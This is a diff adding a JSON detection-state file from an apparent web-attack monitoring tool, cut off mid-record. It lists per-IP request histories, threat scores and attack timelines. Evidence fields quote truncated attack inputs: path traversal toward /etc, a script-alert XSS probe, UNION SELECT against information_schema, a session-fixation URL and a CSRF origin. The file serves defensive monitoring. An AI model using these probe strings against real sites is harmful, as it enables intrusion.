@@ -1,0 +1,5749 @@
+{
+  "date": "2026-05-22",
+  "batch_count": 13,
+  "total_events": 9454,
+  "saved_at": "2026-05-22T09:45:27.640215",
+  "actors": {
+    "0.1.0.1": {
+      "ip": "0.1.0.1",
+      "first_seen": "2025-10-03T20:23:15",
+      "last_seen": "2026-01-22T00:12:56",
+      "total_requests": 37,
+      "requests_by_status": {
+        "200": 17,
+        "302": 10
+      },
+      "unique_uris_accessed": 17,
+      "auth_failures_total": 0,
+      "auth_successes_total": 17,
+      "attack_signatures_seen": [
+        "os_command_injection",
+        "blind_sql_injection",
+        "sql_injection",
+        "local_file_inclusion",
+        "path_traversal",
+        "xss"
+      ],
+      "attack_categories_seen": [
+        "os_command_injection",
+        "blind_sql_injection",
+        "sql_injection",
+        "local_file_inclusion",
+        "path_traversal",
+        "cross_site_scripting"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-01-22T00:12:56",
+          "category": "os_command_injection",
+          "rule_name": "os_command_injection",
+          "evidence": "<150>Jan 22 00:12:56 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 - - [22/Jan/2026:00:12:56 +0000] \"G",
+          "batch_number": 1
+        },
+        {
+          "timestamp": "2025-10-04T01:53:15",
+          "category": "blind_sql_injection",
+          "rule_name": "blind_sql_injection",
+          "evidence": "score=12; patterns=SQL_COMMENT_CONTEXTUAL, DB_FINGERPRINTING, SQL_COMMENT_CONTEXTUAL, DB_FINGERPRINT",
+          "batch_number": 2
+        },
+        {
+          "timestamp": "2025-10-04T01:53:15",
+          "category": "sql_injection",
+          "rule_name": "sql_injection",
+          "evidence": "score=22; patterns=UNION_SELECT, DB_FINGERPRINTING, SQL_COMMENT_CONTEXTUAL, UNION_SELECT, DB_FINGERP",
+          "batch_number": 2
+        },
+        {
+          "timestamp": "2026-01-22T00:12:56",
+          "category": "os_command_injection",
+          "rule_name": "os_command_injection",
+          "evidence": "/content.statementList.fetchJson?searchIn=/content/dam/tcs/investor-relations/financial-statements&s",
+          "batch_number": 2
+        },
+        {
+          "timestamp": "2025-10-04T01:53:15",
+          "category": "blind_sql_injection",
+          "rule_name": "blind_sql_injection",
+          "evidence": "score=12; patterns=SQL_COMMENT_CONTEXTUAL, DB_FINGERPRINTING, SQL_COMMENT_CONTEXTUAL, DB_FINGERPRINT",
+          "batch_number": 3
+        },
+        {
+          "timestamp": "2025-10-04T01:53:15",
+          "category": "sql_injection",
+          "rule_name": "sql_injection",
+          "evidence": "score=22; patterns=UNION_SELECT, DB_FINGERPRINTING, SQL_COMMENT_CONTEXTUAL, UNION_SELECT, DB_FINGERP",
+          "batch_number": 3
+        },
+        {
+          "timestamp": "2026-01-22T00:12:56",
+          "category": "os_command_injection",
+          "rule_name": "os_command_injection",
+          "evidence": "/content.statementList.fetchJson?searchIn=/content/dam/tcs/investor-relations/financial-statements&s",
+          "batch_number": 3
+        },
+        {
+          "timestamp": "2026-01-24T01:01:42",
+          "category": "blind_sql_injection",
+          "rule_name": "blind_sql_injection",
+          "evidence": "score=14; patterns=SLEEP_FUNCTION, SQL_COMMENT_CONTEXTUAL, SLEEP_FUNCTION, SQL_COMMENT_CONTEXTUAL; e",
+          "batch_number": 4
+        },
+        {
+          "timestamp": "2026-01-27T23:31:54",
+          "category": "local_file_inclusion",
+          "rule_name": "local_file_inclusion",
+          "evidence": "/pAccounting/extResources/tooltip/tipsy-docs.js?v=/../..//../..//../..//../..//../..//../..//..///et",
+          "batch_number": 4
+        },
+        {
+          "timestamp": "2026-02-03T04:38:56",
+          "category": "sql_injection",
+          "rule_name": "sql_injection",
+          "evidence": "score=20; patterns=UNION_SELECT, SCHEMA_ENUM, UNION_SELECT, SCHEMA_ENUM; evidence=/?eqbzeyas=<script",
+          "batch_number": 4
+        },
+        {
+          "timestamp": "2026-01-22T00:12:56",
+          "category": "os_command_injection",
+          "rule_name": "os_command_injection",
+          "evidence": "/content.statementList.fetchJson?searchIn=/content/dam/tcs/investor-relations/financial-statements&s",
+          "batch_number": 4
+        },
+        {
+          "timestamp": "2026-01-27T23:31:54",
+          "category": "path_traversal",
+          "rule_name": "path_traversal",
+          "evidence": "/pAccounting/extResources/tooltip/tipsy-docs.js?v=/../..//../..//../..//../..//../..//../..//..///et",
+          "batch_number": 4
+        },
+        {
+          "timestamp": "2026-02-03T04:38:56",
+          "category": "cross_site_scripting",
+          "rule_name": "xss",
+          "evidence": "/?eqbzeyas=<script>alert(\"XSS\");</script>&ygocslug=UNION+SELECT+ALL+FROM+information_schema+AND+\"+or",
+          "batch_number": 4
+        },
+        {
+          "timestamp": "2026-01-22T00:12:56",
+          "category": "os_command_injection",
+          "rule_name": "os_command_injection",
+          "evidence": "<150>Jan 22 00:12:56 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 - - [22/Jan/2026:00:12:56 +0000] \"G",
+          "batch_number": 5
+        },
+        {
+          "timestamp": "2026-01-22T00:12:56",
+          "category": "os_command_injection",
+          "rule_name": "os_command_injection",
+          "evidence": "<150>Jan 22 00:12:56 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 - - [22/Jan/2026:00:12:56 +0000] \"G",
+          "batch_number": 6
+        },
+        {
+          "timestamp": "2025-10-03T20:23:15",
+          "category": "blind_sql_injection",
+          "rule_name": "blind_sql_injection",
+          "evidence": "score=12; patterns=SQL_COMMENT_CONTEXTUAL, DB_FINGERPRINTING, SQL_COMMENT_CONTEXTUAL, DB_FINGERPRINT",
+          "batch_number": 13
+        },
+        {
+          "timestamp": "2025-10-03T20:23:15",
+          "category": "sql_injection",
+          "rule_name": "sql_injection",
+          "evidence": "score=22; patterns=UNION_SELECT, DB_FINGERPRINTING, SQL_COMMENT_CONTEXTUAL, UNION_SELECT, DB_FINGERP",
+          "batch_number": 13
+        },
+        {
+          "timestamp": "2026-01-22T00:12:56",
+          "category": "os_command_injection",
+          "rule_name": "os_command_injection",
+          "evidence": "/content.statementList.fetchJson?searchIn=/content/dam/tcs/investor-relations/financial-statements&s",
+          "batch_number": 13
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 1,
+          "count": 5,
+          "timestamp": "2026-05-22T06:54:51.318499"
+        },
+        {
+          "batch": 2,
+          "count": 5,
+          "timestamp": "2026-05-22T08:49:56.921975"
+        },
+        {
+          "batch": 3,
+          "count": 5,
+          "timestamp": "2026-05-22T08:51:58.116358"
+        },
+        {
+          "batch": 4,
+          "count": 7,
+          "timestamp": "2026-05-22T08:53:38.838981"
+        },
+        {
+          "batch": 5,
+          "count": 5,
+          "timestamp": "2026-05-22T09:06:34.044909"
+        },
+        {
+          "batch": 6,
+          "count": 5,
+          "timestamp": "2026-05-22T09:14:13.850846"
+        },
+        {
+          "batch": 13,
+          "count": 5,
+          "timestamp": "2026-05-22T09:45:27.640215"
+        }
+      ],
+      "threat_score": 1.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 7
+    },
+    "192.0.2.0": {
+      "ip": "192.0.2.0",
+      "first_seen": "2026-02-03T08:15:33",
+      "last_seen": "2026-02-03T13:45:33",
+      "total_requests": 6,
+      "requests_by_status": {
+        "403": 4
+      },
+      "unique_uris_accessed": 3,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [
+        "xss"
+      ],
+      "attack_categories_seen": [
+        "cross_site_scripting"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-02-03T13:45:33",
+          "category": "cross_site_scripting",
+          "rule_name": "xss",
+          "evidence": "<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 192.0.2.0 - - [03/Feb/2026:13:45:33 +0530",
+          "batch_number": 5
+        },
+        {
+          "timestamp": "2026-02-03T13:45:33",
+          "category": "cross_site_scripting",
+          "rule_name": "xss",
+          "evidence": "<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 192.0.2.0 - - [03/Feb/2026:13:45:33 +0530",
+          "batch_number": 6
+        }
+      ],
+      "user_agents_seen": [
+        "-"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 1,
+          "count": 1,
+          "timestamp": "2026-05-22T06:54:51.318499"
+        },
+        {
+          "batch": 2,
+          "count": 1,
+          "timestamp": "2026-05-22T08:49:56.921975"
+        },
+        {
+          "batch": 3,
+          "count": 1,
+          "timestamp": "2026-05-22T08:51:58.116358"
+        },
+        {
+          "batch": 5,
+          "count": 1,
+          "timestamp": "2026-05-22T09:06:34.044909"
+        },
+        {
+          "batch": 6,
+          "count": 1,
+          "timestamp": "2026-05-22T09:14:13.850846"
+        },
+        {
+          "batch": 13,
+          "count": 1,
+          "timestamp": "2026-05-22T09:45:27.640215"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "152.57.136.57": {
+      "ip": "152.57.136.57",
+      "first_seen": "2026-02-18T17:59:51",
+      "last_seen": "2026-02-18T17:59:51",
+      "total_requests": 1,
+      "requests_by_status": {
+        "200": 1
+      },
+      "unique_uris_accessed": 1,
+      "auth_failures_total": 0,
+      "auth_successes_total": 1,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 4,
+          "count": 1,
+          "timestamp": "2026-05-22T08:53:38.838981"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 1
+    },
+    "23.96.179.243": {
+      "ip": "23.96.179.243",
+      "first_seen": "2026-02-18T18:00:37",
+      "last_seen": "2026-02-18T18:00:37",
+      "total_requests": 1,
+      "requests_by_status": {
+        "200": 1
+      },
+      "unique_uris_accessed": 1,
+      "auth_failures_total": 0,
+      "auth_successes_total": 1,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Azure Traffic Manager Endpoint Monitor"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 4,
+          "count": 1,
+          "timestamp": "2026-05-22T08:53:38.838981"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 1
+    },
+    "6.1.8.1": {
+      "ip": "6.1.8.1",
+      "first_seen": "2026-02-17T01:53:15",
+      "last_seen": "2026-02-17T01:53:15",
+      "total_requests": 1,
+      "requests_by_status": {
+        "200": 1
+      },
+      "unique_uris_accessed": 1,
+      "auth_failures_total": 0,
+      "auth_successes_total": 1,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 4,
+          "count": 1,
+          "timestamp": "2026-05-22T08:53:38.838981"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 1
+    },
+    "203.0.113.50": {
+      "ip": "203.0.113.50",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.51": {
+      "ip": "203.0.113.51",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.52": {
+      "ip": "203.0.113.52",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "185.220.101.1": {
+      "ip": "185.220.101.1",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "401": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 5,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "185.220.101.2": {
+      "ip": "185.220.101.2",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "401": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 5,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "45.77.12.10": {
+      "ip": "45.77.12.10",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "403": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "curl/7.88.1"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "91.240.118.12": {
+      "ip": "91.240.118.12",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "session_fixation"
+      ],
+      "attack_categories_seen": [
+        "session_fixation"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "session_fixation",
+          "rule_name": "session_fixation",
+          "evidence": "/dashboard?sessionid=admin123",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "session_fixation",
+          "rule_name": "session_fixation",
+          "evidence": "/dashboard?sessionid=admin123",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "91.240.118.13": {
+      "ip": "91.240.118.13",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "103.21.244.5": {
+      "ip": "103.21.244.5",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "idor"
+      ],
+      "attack_categories_seen": [
+        "idor"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "idor",
+          "rule_name": "idor",
+          "evidence": "/api/users/1001/account",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "idor",
+          "rule_name": "idor",
+          "evidence": "/api/users/1001/account",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.2,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "103.21.244.6": {
+      "ip": "103.21.244.6",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "broken_function_auth"
+      ],
+      "attack_categories_seen": [
+        "broken_function_level_auth"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "broken_function_level_auth",
+          "rule_name": "broken_function_auth",
+          "evidence": "200 OK on admin path: /admin/promoteuser",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "broken_function_level_auth",
+          "rule_name": "broken_function_auth",
+          "evidence": "200 OK on admin path: /admin/promoteuser",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "103.21.244.7": {
+      "ip": "103.21.244.7",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "csrf_indicator"
+      ],
+      "attack_categories_seen": [
+        "csrf"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "csrf",
+          "rule_name": "csrf_indicator",
+          "evidence": "POST cross-origin from http://evil-site.com with missing token",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "csrf",
+          "rule_name": "csrf_indicator",
+          "evidence": "POST cross-origin from http://evil-site.com with missing token",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.2,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "103.21.244.8": {
+      "ip": "103.21.244.8",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.841647"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.918828"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.60": {
+      "ip": "203.0.113.60",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 54,
+      "requests_by_status": {
+        "200": 45
+      },
+      "unique_uris_accessed": 45,
+      "auth_failures_total": 0,
+      "auth_successes_total": 45,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 9,
+          "timestamp": "2026-05-22T09:15:32.202989"
+        },
+        {
+          "batch": 8,
+          "count": 9,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 9,
+          "timestamp": "2026-05-22T09:22:22.176464"
+        },
+        {
+          "batch": 10,
